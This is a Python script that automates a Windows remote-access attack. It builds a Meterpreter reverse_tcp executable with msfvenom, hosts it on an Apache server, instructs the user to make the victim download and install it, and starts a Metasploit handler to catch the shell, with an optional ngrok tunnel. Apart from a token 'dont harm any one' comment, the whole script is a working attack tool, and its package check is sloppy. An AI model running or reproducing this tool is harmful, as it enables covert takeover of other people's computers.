#!/bin/python3
# this script is developed by abugida security team Abrham Asrat(melkam)
#dont harm any one using this script


import os
import subprocess
from cl import color
import os
import random
import socket
import time
import subprocess
import platform
import datetime

def start():
    # Creating Downloaded-Files folder if it does not exist
    try:
        # Creates a folder to store pulled files
        os.mkdir("Downloaded-Files")
    except:
        pass

    # Checking OS
    global operating_system, opener
    operating_system = platform.system()
    if operating_system == "Windows":
        # Windows specific configuration
        windows_config()
    else:
        # macOS only
        if operating_system == "Darwin":
            opener = "open"

        # On Linux and macOS both
        import readline  # Arrow Key

        check_packages()  # Checking for required packages

def windows_config():
    global clear, opener  # , move
    clear = "cls"
    opener = "start"
    # move = 'move'


def check_packages():
    adb_status = subprocess.call(["which", "adb"])
    scrcpy_status = subprocess.call(["which", "/snap/bin/scrcpy"])
    metasploit_status = subprocess.call(["which", "msfconsole"])
    nmap_status = subprocess.call(["which", "nmap"])
    mad_status = subprocess.call(["which", "nmap"])

    if (
        adb_status != 0
        or metasploit_status != 0
        or scrcpy_status != 0
        or nmap_status != 0
    ):
        print(
            f"\n{color.RED}ERROR : The following required software are NOT installed!\n"
        )

        count = 0  # Count variable for indexing

        if adb_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. {color.YELLOW}ADB{color.WHITE}")

        if metasploit_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Metasploit-Framework{color.WHITE}")

        if scrcpy_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Scrcpy{color.WHITE}")

        if nmap_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Nmap{color.WHITE}")
        if mad_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Mad{color.WHITE}")    

        print(f"\n{color.CYAN}Please install the above listed software.{color.WHITE}\n")

        choice = input(
            f"\n{color.GREEN}Do you still want to continue to melkam?{color.WHITE}     Y / N > "
        ).lower()
        if choice == "y" or choice == "":
            return
        elif choice == "n":
            exit_locate()
            return
        else:
            while choice != "y" and choice != "n" and choice != "":
                choice = input("\nInvalid choice!, Press Y or N > ").lower()
                if choice == "y" or choice == "":
                    return
                elif choice == "n":
                    exit_locate()
                    return
                    
os.system(
     f"sudo ./banner"
 )

print(f"{color.ORANGE}1-Private Ip\n2-Public-Ip \n")
choices=input(f"{color.BLUE}What Do you Prefer :")



if choices == "1" :
     

    print(f"\n{color.RED} This is Windows Payload And Listener Generator Do not harm Some One !! {color.RED} ")

    name =input(f"\n{color.GREEN} Enter : Your Name >")
    print(f"\n{color.WHITE} Well come Mr/Ms {color.RED} " + name + f"{color.WHITE} to our Smart Tools!!")
    lhost=input(f"\n{color.ORANGE} Enter : Your Ip You Want To listen >")
    lport=input(f"\n{color.ORANGE} Enter : Your portYou Want To listen >")
    app_name=input(f"\n{color.ORANGE} Enter : THE app Name >")



    print(f"\n{color.GREEN}Generating Your Windows Infected APP............")

    os.system(
            f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {app_name}.exe"
        )
    print(f"\n{color.GREEN}Initiate Your Web server.................")
    os.system(
             f"service apache2 start "
)    
    print(f"\n{color.GREEN}Upload The Infected APP on Your Web server..............")
    os.system(
            f" cp -r {app_name}.exe /var/www/html"
    )

    print(f"\n{color.GREEN}The Above Process Finished Successfully!!")

    print(f"\n{color.BLUE}WEll Finished You have Goto the Victim Browser And Type{color.GREEN} "+ lhost +"/"+app_name+".exe" f"{color.BLUE} and Download And Install and see Your Terminal")

    print("please be pattienc "+ name)



    print(
             f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}"
        )

    os.system(
            f"sudo msfdb init"
)
    os.system(
          f"sudo xterm -hold -fa monaco -fs -7 -bg black -e msfconsole -x 'use exploit/multi/handler ; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST {lhost} ; set LPORT {lport} ; exploit'"
           
          )
elif choices == "2" :    
    port=input("enter the port: ")
    os.system(
         f"xterm -hold -fa monaco -fs -7 -bg black -e ./ngrok http {port}"
    )

